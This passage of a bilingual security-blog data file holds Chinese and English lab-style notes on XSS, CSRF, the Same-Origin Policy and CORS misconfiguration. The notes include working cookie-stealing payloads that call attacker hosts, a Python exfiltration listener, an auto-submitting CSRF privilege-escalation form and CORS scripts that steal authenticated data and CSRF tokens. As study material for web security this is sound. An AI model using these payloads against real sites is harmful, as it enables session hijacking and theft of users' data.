<p>表示攻击者在利用漏洞前必须拥有什么级别的权限。</p>
<ul><li><strong>None (N)</strong>：无需任何登录或特殊权限。</li></ul>
<ul><li><strong>Low (L)</strong>：需要普通用户权限。</li></ul>
<ul><li><strong>High (H)</strong>：需要管理员级别权限。</li></ul>
<h4>4. User Interaction（用户交互）</h4>
<p>表示漏洞利用时，是否必须依赖受害者做某些动作。</p>
<ul><li><strong>None (N)</strong>：攻击者自己就能完成利用。</li></ul>
<ul><li><strong>Required (R)</strong>：必须用户点击、访问、打开某内容后才能触发。</li></ul>
<h4>5. Scope（影响范围）</h4>
<p>表示漏洞利用后，影响是否超出原本的安全边界。</p>
<ul><li><strong>Unchanged (U)</strong>：影响只局限于当前组件或同一安全域内资源。</li></ul>
<ul><li><strong>Changed (C)</strong>：利用一个组件的漏洞，却能影响另一个组件，例如服务器上的漏洞影响到了浏览器。</li></ul>
<h4>6. Confidentiality（机密性）</h4>
<p>表示漏洞利用后，对信息保密性的影响。</p>
<ul><li><strong>None (N)</strong>：没有影响。</li></ul>
<ul><li><strong>Low (L)</strong>：有部分信息泄露，但攻击者不能完全控制获取什么。</li></ul>
<ul><li><strong>High (H)</strong>：严重泄露，攻击者能获取大量甚至完全控制可读信息。</li></ul>
<h4>7. Integrity（完整性）</h4>
<p>表示漏洞利用后，对数据可信度和准确性的影响。</p>
<ul><li><strong>None (N)</strong>：没有影响。</li></ul>
<ul><li><strong>Low (L)</strong>：只能有限修改数据，影响较轻。</li></ul>
<ul><li><strong>High (H)</strong>：可以修改关键数据或全部数据，影响严重。</li></ul>
<h4>8. Availability（可用性）</h4>
<p>表示漏洞利用后，对系统可用性的影响。</p>
<ul><li><strong>None (N)</strong>：没有影响。</li></ul>
<ul><li><strong>Low (L)</strong>：服务性能下降，但不能完全拒绝服务。</li></ul>
<ul><li><strong>High (H)</strong>：服务严重受影响甚至中断。</li></ul>
<hr />
<h3>示例</h3>
<p>文中给了两个例子，说明如何使用 CVSS 3.1 对漏洞做严重性分析。</p>
<h4>例子 1：Cisco ASA 缓冲区溢出漏洞</h4>
<p>这个漏洞的 CVSS 3.1 分数是 <strong>9.8（Critical，严重）</strong>。 因为它可以通过网络远程利用，不需要认证，也不需要用户交互，攻击复杂度低，最终还能让攻击者获得反向 shell。于是它在机密性、完整性、可用性三个维度上都被评为 <strong>High</strong>。这类漏洞基本上就是“远程接管设备”的典型高危漏洞，分高得很合理，没什么悬念。</p>
<h4>例子 2：管理员后台的存储型 XSS</h4>
<p>这个漏洞的 CVSS 3.1 分数是 <strong>5.5（Medium，中危）</strong>。 虽然攻击可以通过网络发起，复杂度也不高，但前提是攻击者本身必须已经具备管理员权限，也就是说 <strong>Privileges Required = High</strong>。此外，这个漏洞的影响主要体现在 DOM 访问和一定程度上的应用完整性影响，不能直接导致服务不可用，因此 Confidentiality 和 Integrity 是 <strong>Low</strong>，Availability 是 <strong>None</strong>。 这说明 CVSS 打分不是只看漏洞名字，<strong>不是看到 XSS 就自动高危</strong>，而是要看具体利用条件和影响范围。</p>
<hr />
<h3>优秀报告示例</h3>
<p>最后这一部分列举了一些 HackerOne 选出的优秀漏洞报告案例，比如：</p>
<ul><li>导致所有实例获得 ROOT 权限</li></ul>
<ul><li>桌面应用远程代码执行</li></ul>
<ul><li>通过 API Explorer 暴露其他账户全名</li></ul>
<ul><li>无权限员工可以修改商店客户邮箱</li></ul>
<ul><li>使用 Google 登录时触发 XSS</li></ul>
<ul><li>招聘页面 XSS</li></ul>
<p>这些例子的意义不是让你背标题，而是让你理解：<strong>好报告的标题通常都非常直观，能一眼看出漏洞类型、受影响对象和核心影响。</strong></p>`
    }
  },
{
    id: "advanced-xss-csrf",
    href: "posts/web/advanced-xss-csrf.html",
    title: {
      "en": "Advanced XSS and CSRF Exploitation",
      "zh": "高级 XSS 与 CSRF 利用"
    },
    category: "web",
    categoryLabel: {
      "en": "Web",
      "zh": "Web"
    },
    description: {
      "en": "A structured learning note about XSS, CSRF, the Same-Origin Policy, CORS, CORS misconfiguration, and CSRF token bypasses.",
      "zh": "系统整理 XSS、CSRF、同源策略、CORS、CORS 错误配置与 CSRF Token 绕过。"
    },
    date: "2026-05-07",
    content: {
      "en": "A structured learning note about XSS, CSRF, the Same-Origin Policy, CORS, CORS misconfiguration, and CSRF token bypasses.",
      "zh": "系统整理 XSS、CSRF、同源策略、CORS、CORS 错误配置与 CSRF Token 绕过。"
    },
    code: "XSS -> authenticated browser action -> data access or CSRF bypass",
    contentHtml: {
      en: String.raw`<h2>XSS Vulnerability Overview</h2>
<p><strong>XSS (Cross-Site Scripting)</strong> is a web vulnerability where attacker-controlled JavaScript is injected into a page and executed in another user's browser. The browser treats the injected code as trusted page content, so the attacker gains execution in the victim's web session.</p>
<ul><li><strong>Stored XSS:</strong> the payload is stored by the application, such as in a post, comment, or profile field, and runs whenever another user views that content.</li><li><strong>Reflected XSS:</strong> the payload is reflected in an immediate server response, such as a search result or error message.</li><li><strong>DOM-based XSS:</strong> client-side JavaScript reads attacker-controlled data and writes it into a dangerous DOM sink.</li></ul>
<pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<h3>DOM XSS: Source and Sink</h3>
<p>DOM XSS can be understood as a data-flow problem. A <strong>source</strong> is where attacker-controlled data enters JavaScript, and a <strong>sink</strong> is where that data is written into the DOM or executed as code.</p>
<pre><code>attacker input -> source -> JavaScript processing -> sink -> browser execution</code></pre>
<p>Common sources include <code>document.URL</code>, <code>location.hash</code>, <code>location.search</code>, and <code>postMessage</code>. Common dangerous sinks include <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, and string-based event handlers.</p>
<pre><code class="language-javascript">var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
if (pos > 0) {
  document.getElementById("todo").innerHTML = "&lt;b&gt;Next Task:&lt;/b&gt; " + decodeURIComponent(task);
}</code></pre>
<h3>Cookie Theft and Session Impact</h3>
<p>If cookies are readable by JavaScript, XSS can be used to exfiltrate them. In real applications, <code>HttpOnly</code>, SameSite, session binding, and server-side authorization checks can reduce this impact, but XSS is still dangerous because it executes inside the authenticated browser context.</p>
<pre><code class="language-javascript">new Image().src = 'https://attacker.example/log?c=' + encodeURIComponent(document.cookie);</code></pre>
<hr />
<h2>Advanced CSRF and XSS Exploitation</h2>
<p>Modern browsers include defenses such as the Same-Origin Policy, CORS, and SameSite cookies. These controls make simple CSRF less reliable, but XSS and CORS misconfiguration can still produce powerful attack chains.</p>
<h3>Using XMLHttpRequest and Fetch</h3>
<p>When JavaScript executes in a victim browser, it can use <code>XMLHttpRequest</code> or the Fetch API to send HTTP requests. This makes XSS useful for interacting with the vulnerable application and, in some cases, with internal services reachable by the victim.</p>
<pre><code class="language-javascript">var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://exfiltrate.example/', false);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('param1=hello&param2=world');</code></pre>
<pre><code class="language-javascript">const response = await fetch('https://exfiltrate.example/', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'param1=hello&param2=world'
});</code></pre>
<h3>Exploit Server and Data Exfiltration Server</h3>
<p>An exploit server is useful for hosting payloads and delivering them to a victim. A separate HTTPS listener can be used to receive exfiltrated data. HTTPS matters because modern browsers may block insecure resource loads from secure pages.</p>
<pre><code class="language-shell">openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</code></pre>
<pre><code class="language-python">from http import server
import ssl

class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        if body:
            self.log_message("[i] POST body: %s", body.decode("utf-8", errors="replace"))
        self.send_response(200)
        self.end_headers()

httpd = server.HTTPServer(('0.0.0.0', 4443), CustomRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='./server.pem')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()</code></pre>
<hr />
<h2>CSRF</h2>
<p>CSRF abuses the fact that a browser may automatically include credentials when sending a request to a site where the victim is already logged in. A classic payload creates a form that submits automatically when the victim opens the attack page.</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.example/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="attacker" /&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>CSRF tokens and SameSite cookies are designed to reduce this risk. However, if XSS is present, or if CORS is misconfigured in a way that allows reading authenticated responses, those protections can be weakened or bypassed.</p>
<hr />
<h2>Same-Origin Policy and CORS</h2>
<h3>Same-Origin Policy</h3>
<p>An origin is the combination of scheme, host, and port. JavaScript from one origin is normally prevented from reading responses from another origin. This prevents a malicious website from reading a victim's mailbox, bank data, or internal web applications.</p>
<pre><code>https://example.com:443
scheme = https
host   = example.com
port   = 443</code></pre>
<blockquote>The Same-Origin Policy usually blocks reading cross-origin responses. It does not necessarily stop the request from being sent.</blockquote>
<h3>CORS</h3>
<p>CORS is a controlled exception to the Same-Origin Policy. A server uses response headers to tell the browser which origins may read responses, which methods are allowed, which headers are allowed, and whether credentials may be included.</p>
<ul><li><code>Access-Control-Allow-Origin</code>: the origin allowed to read the response.</li><li><code>Access-Control-Allow-Credentials</code>: whether credentialed requests may be exposed to JavaScript.</li><li><code>Access-Control-Allow-Methods</code>: methods allowed after preflight.</li><li><code>Access-Control-Allow-Headers</code>: request headers allowed after preflight.</li><li><code>Access-Control-Max-Age</code>: how long the preflight result may be cached.</li></ul>
<h3>Preflight Requests</h3>
<p>Requests that are not simple requests cause the browser to send an <code>OPTIONS</code> preflight request before the real request. The preflight asks whether the method and headers are allowed.</p>
<pre><code>Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type</code></pre>
<hr />
<h2>CORS Misconfigurations</h2>
<h3>Arbitrary Origin Reflection</h3>
<p>If an application reflects any supplied <code>Origin</code> into <code>Access-Control-Allow-Origin</code> and also sets <code>Access-Control-Allow-Credentials: true</code>, an attacker-controlled website may read authenticated responses.</p>
<pre><code>Origin: https://evil.example
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true</code></pre>
<pre><code class="language-javascript">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.example/data.php', true);
xhr.withCredentials = true;
xhr.onload = () => {
  fetch('https://attacker.example/log', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({data: btoa(xhr.responseText)})
  });
};
xhr.send();</code></pre>
<h3>Improper Origin Whitelist</h3>
<p>Weak prefix or suffix checks can trust attacker-controlled domains that merely look similar to trusted domains. Origin validation should compare the full scheme, host, and port against an explicit allowlist.</p>
<h3>Trusted null Origin</h3>
<p>Some browser contexts can send <code>Origin: null</code>, such as sandboxed iframes without <code>allow-same-origin</code>. Trusting <code>null</code> can give an attacker a route to read sensitive responses.</p>
<h3>Targeting Internal Networks</h3>
<p>Even without credentials, permissive CORS on an unauthenticated internal API can let an attacker read data through a victim browser that can reach the internal network.</p>
<hr />
<h2>Bypassing CSRF Tokens with CORS Misconfiguration</h2>
<p>If CORS allows a malicious origin to read authenticated responses, an attacker can first request a page containing a CSRF token, extract the token, and then submit a protected state-changing request with a valid token.</p>
<pre><code class="language-javascript">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.example/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var token = encodeURIComponent(doc.getElementById('csrf').value);</code></pre>
<blockquote>Classic CSRF can often send requests. A dangerous CORS misconfiguration can also let the attacker read responses and harvest dynamic tokens.</blockquote>
<hr />
<h2>Defensive Notes</h2>
<ul><li>Do not reflect arbitrary origins.</li><li>Do not combine credentials with broad origin trust.</li><li>Validate origins with exact scheme, host, and port matching.</li><li>Avoid trusting <code>null</code>.</li><li>Use SameSite cookies, CSRF tokens, and server-side authorization checks together.</li><li>Treat XSS as a serious risk because it runs inside the authenticated browser context.</li></ul>`,
      zh: String.raw`<h2>漏洞简介</h2>
<p><strong>XSS（Cross-Site Scripting）</strong> 是一种常见的 Web 安全漏洞，本质是：</p>
<blockquote>攻击者把恶意脚本（通常是 JavaScript）注入到网页中，让其他用户在浏览该页面时执行这些脚本。</blockquote>
<p>也就是说：</p>
<ul><li>攻击代码被“存”在网页或请求里</li><li>浏览器误认为是“正常内容”执行了</li><li>最终<strong>在受害者浏览器中执行攻击者的代码</strong></li></ul>
<div class="post-table-wrap"><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>Stored (Persistent) XSS</code></td><td>最严重的 XSS 类型是当用户输入存储在后端数据库中，然后在检索时显示（例如，帖子或评论）时发生的 XSS 攻击。</td></tr><tr><td><code>Reflected (Non-Persistent) XSS</code></td><td>当用户输入的内容经后端服务器处理后显示在页面上，但尚未存储时（例如，搜索结果或错误消息），就会发生这种情况。</td></tr><tr><td><br /><code>DOM-based XSS</code></td><td>另一种非持久性 XSS 类型，当用户输入直接显示在浏览器中并在客户端完全处理，而无需到达后端服务器时就会发生（例如，通过客户端 HTTP 参数或锚标记）。</td></tr></tbody></table></div>
<pre><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
<ul><li><code>window.origin</code> 显示的是当前站点的协议 + 域名 + 端口</li><li><code>document.cookie</code> 显示的是当前页面可读到的 Cookie</li></ul>
<p><strong>DOM XSS</strong></p>
<p>什么是 Source 和 Sink 在 <strong>DOM-based XSS</strong> 里，你可以把整个过程理解成两步：</p>
<ol><li><strong>Source（源）</strong>：用户可控数据从哪里进入页面脚本</li><li><strong>Sink（汇）</strong>：这些数据最终被写到哪里，并且是否会被浏览器当成代码/HTML解析执行</li></ol>
<p>也就是说：</p>
<blockquote><strong>Source 负责“进来”，Sink 负责“落地”</strong></blockquote>
<p>只要满足下面这个链条，就可能形成 DOM XSS： 用户可控输入 → Source 读取 → JavaScript 处理 → Sink 写入 DOM → 浏览器解析并执行恶意内容</p>
<pre><code class="language-JavaScript"># 当整个页面 DOM 加载完成后，执行里面的代码。 等价于: $(document).ready(function () {
$(function () {
	# 给id 为add的元素绑定一个点击事件,
    $("#add").click(function () {
	    # \`$("#task")\`, 选中 id 为 \`task\` 的元素
	    # \`.val()\` , 取这个输入框当前的值。
	    # \`.length &gt; 0\`, 判断输入内容是不是非空。
        if ($("#task").val().length &gt; 0) {
	        
	        # 修改当前页面 URL, 如果输入为test, 将其变为 \`http://example.com/#task=test\`
            window.location.href = "#task=" + $("#task").val();
            var pos = document.URL.indexOf("task=");
            var task = document.URL.substring(pos + 5, document.URL.length);
            
            # \`.innerHTML = ...\`, 把右侧的内容作为 HTML 写进这个元素中。
            # decodeURIComponent(task), 把 URL 编码内容解码。   %3C -&gt; &lt;
            document.getElementById("todo").innerHTML = "&lt;b&gt;Next Task:&lt;/b&gt; " + decodeURIComponent(task);
        }
    });
});
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
if (pos &gt; 0) {
    document.getElementById("todo").innerHTML = "&lt;b&gt;Next Task:&lt;/b&gt; " + decodeURIComponent(task);
}
</code></pre>
<pre><code>...PAYLOAD... &lt;!--</code></pre>
<p><strong>会话劫持</strong></p>
<pre><code>document.location='http://OUR_IP/index.php?c='+document.cookie; 
new Image().src='http://OUR_IP/index.php?c='+document.cookie;</code></pre>
<pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;11111&lt;/span&gt;&amp;quot;</code></pre>
<ul><li><code>&amp;quot;</code> 是 HTML 实体，表示英文双引号 <code>"</code>。</li></ul>
<p>payload <code>&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;</code> 被编码转换为<code>&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt</code> ,网站对 <code>&lt;</code> 和 <code>&gt;</code> 做了 HTML 实体编码 ,所以不会被执行.</p>
<pre><code>Results for &amp;quot;&lt;span class="page-description search-term"&gt;&amp;lt;/span&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/span&gt;&amp;quot;</code></pre>
<h2>高级 CSRF 与 XSS 利用介绍</h2>
<p>跨站点请求伪造（CSRF）和跨站点脚本（XSS）</p>
<p><strong>现代CSRF和XSS攻击的现实应用</strong> 我们将在本模块中讨论的那样，现代网络浏览器中的许多安全策略和安全措施限制或阻止了对 CSRF 漏洞的基本利用。例如，同源策略、跨域资源共享 (CORS) 和 SameSite Cookie，我们将在后续章节中进一步探讨。</p>
<p>因此，在现实世界中，单纯的 CSRF 漏洞利用变得越来越少见。然而，如果我们发现 XSS 漏洞，就可以将 XSS 和 CSRF 漏洞的利用结合起来，从而获得一种强大的工具，使我们能够攻击存在漏洞的 Web 应用程序本身，甚至可能攻击受害者内部网络中的其他 Web 应用程序。</p>
<p>要利用 CSRF 和 XSS 漏洞并与存在漏洞的 Web 应用程序交互，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="noreferrer">XMLHttpRequest</a>对象或更现代的<a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API" target="_blank" rel="noreferrer">Fetch API</a>。我们可以使用这两种方法从 JavaScript 代码发出 HTTP 请求，并指定 HTTP 参数，例如请求方法、HTTP 标头或请求体。</p>
<p>例如，我们可以<code>XMLHttpRequest</code>通过在调用 <code>send_post()</code> 函数时指定 URL <code>xhr.open</code>、使用 <code>set_HTTP_headers()</code> 函数设置 HTTP 标头<code>xhr.setRequestHeader</code>以及在调用 <code>send_post_body()</code> 函数时指定请求体参数来使用该对象发送 POST 请求<code>xhr.send</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest(); 
xhr.open('POST', 'http://exfiltrate.htb/', false); 
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
xhr.send('param1=hello&amp;param2=world');</code></pre>
<p>另一方面，我们可以使用<code>Fetch API</code>如下方式发送相同的请求：</p>
<pre><code class="language-js">const response = await fetch('http://exfiltrate.htb/', {
    method: "POST",
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'param1=hello&amp;param2=world',
  });</code></pre>
<p>该函数<code>fetch</code>第一个参数需要传入 URL。我们可以将所有其他请求参数放在一个对象中，作为第二个参数传入。</p>
<p><strong>lab环境</strong> 实验室由以下部分组成：</p>
<ul><li>一个漏洞利用开发服务器<code>https://exploitserver.htb</code></li><li>我们正在评估给定虚拟主机上存在漏洞的Web应用程序。例如：<code>https://vulnerablesite.htb</code></li><li>此外，我们将在自己的系统上托管一个 HTTPS 网络服务器，以便我们能够泄露数据。</li></ul>
<p><strong>漏洞利用开发服务器</strong></p>
<p>我们可以使用漏洞开发服务器来<code>exploitserver.htb</code>开发 CSRF 或 XSS 有效载荷，并将漏洞利用程序传递给受害者。 漏洞利用开发服务器使我们能够开发针对目标 Web 应用程序中发现的特定漏洞的自定义漏洞利用程序。假设，对于目标 Web 应用程序中的 XSS 概念验证，我们希望触发一个警告框：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415041746.png" alt="Pasted image 20260415041746" />
<p>我们可以通过访问该端点来查看我们开发的漏洞利用程序<code>/exploit</code>。这样做会触发警报弹出窗口：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415041800.png" alt="Pasted image 20260415041800" />
<p>最后，我们可以通过访问目标端点将漏洞利用程序传递给受害者<code>/deliver</code>，这将导致受害者通过访问目标地址来触发我们开发的攻击载荷<code>https://exploitserver.htb/exploit</code>。这在 CSRF 攻击中非常有用，因为受害者必须主动访问攻击载荷才能触发漏洞利用代码。本模块侧重于漏洞利用程序的开发，而非漏洞利用程序的传递方法。将攻击载荷传递给受害者会强制触发漏洞利用程序。在现实世界中，存在多种漏洞利用程序传递方法，包括通过电子邮件或任何即时通讯服务向受害者发送链接。</p>
<p>我们还可以利用漏洞利用服务器来开发 XSS 攻击载荷。但是，在这种情况下，我们无需将漏洞利用程序直接传递给受害者，因为攻击载荷会通过注入到易受攻击站点上的 XSS 攻击载荷进行传播。</p>
<p><strong>HTTPS数据泄漏服务器</strong> 在本模块中，所有实验均运行在启用 HTTPS 的 Web 服务器上。现代 Web 浏览器实施了安全措施，防止 HTTPS 网站通过未加密的 HTTP 连接加载资源。为避免出现问题，我们将使用 Python 设置一个接受 HTTPS 请求的 Web 服务器。首先，我们需要为服务器生成一个新的自签名证书以支持加密通信。我们可以使用以下命令完成此操作。证书的详细信息可以任意指定：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</code></pre>
<p>接下来，我们可以创建一个简单的 Python HTTPS 服务器，将传入的请求记录到标准输出（stdout）并保存到文件中<code>server.py</code>。我们需要为传入的<code>OPTIONS</code>请求配置 CORS，以便允许 JavaScript 请求体发出 POST 请求：</p>
<pre><code class="language-python">from http import server
import ssl

class CustomRequestHandler(server.SimpleHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        super().do_GET()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)

        if body:
            self.log_message("[i] POST body: %s", body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.end_headers()

print("Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...")
httpd = server.HTTPServer(('0.0.0.0', 4443), CustomRequestHandler)
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile='./server.pem')
httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()</code></pre>
<p>之后，我们可以通过执行该文件来运行服务器<code>server.py</code>。为了测试服务器，让我们<code>curl</code>在第二个终端中快速发送一个测试请求：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/get?Hello=World
Chenduoduo@htb[/htb]$ curl -vk https://127.0.0.1:4443/post?Hello=World -d 'test=123'</code></pre>
<p>我们可以看到，请求 URL、所有 GET 参数和所有 POST 参数都打印在 Web 服务器运行的终端中。就本模块的目的而言，这足以满足数据泄露的需求：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
127.0.0.1 - - [30/Nov/2025 11:18:12] code 404, message File not found
127.0.0.1 - - [30/Nov/2025 11:18:12] "GET /get?Hello=World HTTP/1.1" 404 -
127.0.0.1 - - [30/Nov/2025 11:18:29] [i] POST body: test=123
127.0.0.1 - - [30/Nov/2025 11:18:29] "POST /post?Hello=World HTTP/1.1" 200 -</code></pre>
<p>虽然本模块所有实验环境均已禁用证书验证，但在实际应用中仍应避免使用自签名证书，因为现代浏览器可能会因 HTTPS 配置不当而拒绝通过不安全连接加载资源。有关 HTTPS 的更多详细信息，请参阅“HTTPS/TLS 攻击”模块。</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们可以在攻击服务器上创建一个 cookie 窃取有效载荷，例如以下代码。为了窃取 cookie，我们可以使用系统上运行的 HTTPS 服务器：</p>
<pre><code class="language-js">windows.location = "https://10.10.14.45:4443/cookiestealer?=" + document.cookie;</code></pre>
<p>保存漏洞利用程序后，我们可以通过访问端点来确认程序是否已保存<code>/exploit</code>：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043149.png" alt="Pasted image 20260415043149" />
<p>最后，我们必须等待管理员用户访问留言簿。注入的 XSS 有效载荷会导致管理员的浏览器从攻击服务器加载有效载荷，从而将管理员用户的 cookie 泄露到我们的系统中：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

10.129.233.62 - - [31/Dec/2024 13:37:36] code 404, message File not found
10.129.233.62 - - [31/Dec/2024 13:37:36] "GET /cookiestealer?c=PHPSESSID=tiitsevk7pns4kmrcmjecm9qq6 HTTP/1.1" 404</code></pre>
<p><strong>CSRF</strong></p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043309.png" alt="Pasted image 20260415043309" />
<p>然而，我们可以看到我们只有<code>user</code>这些权限。这里有一个<code>promote</code>按钮。如果我们点击它，Web 应用程序会提示我们只有管理员用户才能提升其他用户。但是，我们可以看到提升操作是通过以下请求实现的：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043318.png" alt="Pasted image 20260415043318" />
<p>具体来说，这个端点缺少 CSRF 保护，这使得我们可以发起 CSRF 攻击，强制管理员提升我们用户的权限。为此，我们需要创建一个与提升请求对应的 HTML 表单：</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.labintro.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>由于我们不希望攻击需要额外的用户交互，我们将添加 JavaScript 代码，以便在页面加载完成后自动提交表单：</p>
<pre><code class="language-html">&lt;script&gt;     
	document.forms[0].submit(); 
&lt;/script&gt;</code></pre>
<p>将这两部分结合起来，会得到以下有效载荷，我们将把它保存在漏洞利用服务器中：</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://csrf.labintro.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre>
<p><code>View Exploit</code>我们可以通过登录到存在漏洞的应用程序后点击某个链接来测试我们的漏洞利用。这将向某个服务器发送请求<code>https://exploitserver.htb/exploit</code>，该服务器会返回我们保存的有效载荷。该有效载荷会自动提交表单，从而向存在漏洞的 Web 应用程序发起跨域请求。但是，由于我们不是管理员，因此权限提升失败：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043428.png" alt="Pasted image 20260415043428" />
<p>然而，这证实了我们的 CSRF 有效载荷已成功发送 HTTP 请求以提升用户权限。要执行攻击，我们可以将有效载荷传递给受害者并选择当前的虚拟主机<code>csrf.labintro.htb</code>。这将导致受害者访问某个页面<code>https://exploitserver.htb/exploit</code>。等待几秒钟并刷新页面后，我们就会获得管理员权限：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415043442.png" alt="Pasted image 20260415043442" />
<h2>同源策略与 CORS</h2>
<h3>同源策略</h3>
<p>同源策略是一种在网页浏览器中实现的安全机制，旨在防止网站的跨源访问。特别是，运行在一个源节点上的 JavaScript 代码无法访问另一个源节点。这防止恶意网站从其他来源窃取信息，并限制其向其他来源发送的请求类型。</p>
<p><code>origin</code>定义为URL的<code>scheme</code>, <code>host</code>, and <code>port</code>. 只要两个URL在这三个属性中至少有一个不同, 就不是同源.</p>
<p>两个 URL <strong>同源（same origin）</strong> 必须满足三点完全相同：</p>
<div class="post-table-wrap"><table><thead><tr><th>项目</th><th>必须相同</th></tr></thead><tbody><tr><td>协议（Protocol）</td><td>http / https</td></tr><tr><td>域名（Host）</td><td>example.com</td></tr><tr><td>端口（Port）</td><td>80 / 443</td></tr></tbody></table></div>
<p>鉴于浏览器实施了同源策略，其软件中的漏洞和漏洞可能导致绕过，从而可能引发高严重的安全漏洞。</p>
<p><strong>没有同源策略</strong></p>
<p>假设在访问我们私人笔记本电脑 <code>https://exploitationserver.htb</code> 的恶意网站时，它执行了以下 JavaScript 代码：</p>
<pre><code class="language-html">&lt;script&gt;
    async function exfiltrate_data(url) {
        // get data
        const response = await fetch(url, {credentials: "include"});
        const data = await response.text();

        // exfiltrate data
        await fetch("https://attacker_system.htb/exfiltrate?c=" + btoa(data));
    }

    // exfiltrate mails
    exfiltrate_data("https://mymails.htb/getmails");

    // exfiltrate bank data
    exfiltrate_data("https://mybank.htb/myaccounts");

    // exfiltrate internal service
    exfiltrate_data("https://192.168.178.5/");
&lt;/script&gt;</code></pre>
<p><code>https://exploitationserver.htb</code> 上的 JavaScript 代码向我们的浏览器发出三次取 <code>https://mymails.htb/getmails</code>、<code>https://mybank.htb/myaccounts</code> 和 <code>https://192.168.178.5/</code> 的取用请求。如果我们登录了这些网站中的任意一个，浏览器可能会根据 <code>SameSite</code> cookie 配置的设置发送会话 Cookie，从而使这些请求获得认证。JavaScript 代码随后通过将响应发送回攻击者控制的系统 <code>https：//attacker_system.htb/exfiltrate</code> 来泄露。这样，运行 <code>https：//attacker_system.htb</code> 的攻击者就能从我们的用户账户获取对三次认证 GET 请求的响应，从而访问我们的 <code>https://mymails.htb</code> 邮箱、银行信息和账户余额 <code>https://mybank.htb</code>，甚至访问我们家内部 <code>https://192.168.178.5</code> 网络中的维基（该维基不公开，只能通过局域网访问）。</p>
<p>这是严重的安全违规，我们无力阻止其发生。同源政策专门设计来缓解这一问题。</p>
